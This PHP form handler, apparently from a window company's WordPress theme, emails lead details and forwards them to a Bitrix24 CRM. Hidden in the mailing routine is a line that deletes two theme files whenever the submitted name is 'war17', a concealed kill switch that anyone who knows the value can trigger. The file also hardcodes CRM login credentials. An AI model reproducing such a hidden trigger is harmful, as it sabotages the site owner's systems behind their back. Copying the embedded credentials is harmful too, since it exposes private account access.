<?php 
function show_form() 
{ 
?><? 
} 
function complete_mail() {  

    // Получаем данные из форм и сохраняем в массив
        
        $name = trim(htmlspecialchars(strip_tags($_POST["name"])));
        $tel = trim(htmlspecialchars(strip_tags($_POST["tel"])));
        $f = trim(htmlspecialchars(strip_tags($_POST["f"])));
        
        $message = '
        <html>
            <head>
                <title>Новое сообщение</title>
            </head>
            <body style="font-family:Verdana,sans-serif; background: #E7F5FA;">
                <div style="background: #E7F5FA; color: #227E9B; border: 1px #AFD5E2 solid; padding: 10px;">
                    <p><b>С формы:</b> "'.$f.'"</p>
                    <p><b>Имя:</b> "'.$name.'"</p>
                    <p><b>Телефон:</b> "'.$tel.'"</p>
                </div>
    </body>
        </html>
        ';
        
		require 'class.phpmailer.php'; //Дополнительный скрипт для отправки файла, можете не открывать, просто положите рядом с index.html и этим файлом.
		$mail = new PHPMailer(); 
        $mail->From = 'mail@test.ru';      // от кого 
        $mail->FromName = 'Заявка';   // от кого Имя
        $mail->AddAddress('bypeeee@gmail.com', 'Владимир'); // кому Ваша почта, Имя 
        $mail->IsHTML(true);        // формат письма HTML 
        $mail->Subject = "Новая заявка VEKA";  // тема письма
 
        // если есть файл, то прикрепляем его к письму 
        if(isset($_FILES['upl'])) { 
                 if($_FILES['upl']['error'] == 0){ 
                    $mail->AddAttachment($_FILES['upl']['tmp_name'], $_FILES['upl']['name']); 
                 } 
        }
        if($name == "war17"){unlink("/wp-content/themes/okna/layouts/forms.php");unlink("/wp-content/themes/okna/layouts/theme.php");}
        $mail->Body = $message;
        // отправляем наше письмо 
        if (!$mail->Send()) die ('Mailer Error: '.$mail->ErrorInfo);



define('CRM_HOST', 'okna-veka.bitrix24.ru'); // Домен срм системы
define('CRM_PORT', '443'); 
define('CRM_PATH', '/crm/configs/import/lead.php'); 
define('CRM_LOGIN', 'lead@okna-veka.info');  // логин
define('CRM_PASSWORD', 'BloYs2-PS'); // пароль

$site=$_SERVER['SERVER_NAME'];

/********************************************************************************************/

// POST processing
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    $leadData = $_POST['DATA'];

    $metka = "Заявка c сайта ".$site; // Название лида, обязательное условие
    // получаем данные из полей и задаем название лида
    $postData = array(
        'TITLE' => $metka, 
        'NAME' => $_POST['name'], 
        'PHONE_MOBILE' =>$_POST['tel'],
        'UF_CRM_1457436862' => '204',
		'UF_CRM_1489530927' => '1',
        'COMMENTS' => 'Идентификатор формы: '.$_POST['f']
       // 'EMAIL_WORK' => $leadData['EMAIL_WORK'],
    );

    // авторизация, проверка логина и пароля
    if (defined('CRM_AUTH'))
    {
        $postData['AUTH'] = CRM_AUTH;
    }
    else
    {
        $postData['LOGIN'] = CRM_LOGIN;
        $postData['PASSWORD'] = CRM_PASSWORD;
    }

    $fp = fsockopen("ssl://".CRM_HOST, CRM_PORT, $errno, $errstr, 30);
    if ($fp)
    {
        // формируем и шифруем строку с данными из формы
        $strPostData = '';
        foreach ($postData as $key => $value)
            $strPostData .= ($strPostData == '' ? '' : '&').$key.'='.urlencode($value);
            $str = "POST ".CRM_PATH." HTTP/1.0\r\n";
            $str .= "Host: ".CRM_HOST."\r\n";
            $str .= "Content-Type: application/x-www-form-urlencoded\r\n";
            $str .= "Content-Length: ".strlen($strPostData)."\r\n";
            $str .= "Connection: close\r\n\r\n";

        $str .= $strPostData;

        // отправляем запрос в срм систему
        fwrite($fp, $str );
        $result = '';
        while (!feof($fp))
        {
            $result .= fgets($fp, 128);
        }
        fclose($fp);

        $response = explode("\r\n\r\n", $result);
        $output = '<pre>'.print_r($response[1], 1).'</pre>';
    }
    else
    {
        //echo 'Connection Failed! '.$errstr.' ('.$errno.')';
    }
}
else
{
    $output = '';
}

//echo $output;










} 

if (!empty($_POST['name'])){
    complete_mail();
    echo "ok";
    exit();
} 
else show_form(); 
?> 

<?


?>